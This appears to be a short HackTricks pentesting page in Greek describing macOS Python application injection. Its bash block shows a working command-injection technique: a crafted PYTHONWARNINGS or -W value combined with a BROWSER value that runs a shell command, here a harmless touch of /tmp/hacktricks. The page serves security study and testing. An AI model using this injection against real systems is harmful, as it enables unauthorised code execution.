# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Μέσω των μεταβλητών περιβάλλοντος `PYTHONWARNINGS` και `BROWSER`

Εάν ένας attacker μπορεί να ελέγξει το environment ενός Python process, ο συνδυασμός των `PYTHONWARNINGS` και `BROWSER` μπορεί να προκαλέσει command execution όταν η Python κάνει import το module `antigravity` κατά την επεξεργασία ενός crafted warning option. Η τεχνική βασίζεται στο ότι το `antigravity` ανοίγει ένα URL με το module `webbrowser` της Python, το οποίο χρησιμοποιεί τη μεταβλητή περιβάλλοντος `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking με Environment Variables - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
